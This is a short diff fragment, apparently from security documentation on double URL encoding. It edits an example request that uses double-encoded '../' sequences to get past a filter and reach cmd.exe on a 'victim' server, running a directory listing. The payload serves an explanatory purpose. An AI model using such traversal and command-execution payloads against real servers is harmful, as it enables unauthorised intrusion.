@@ -48,7 +48,7 @@ it’s possible to bypass the security filter:
 
 Double encoded URL:
 
-`http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\ `
+`http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\ `
 
 ### Example 2
 
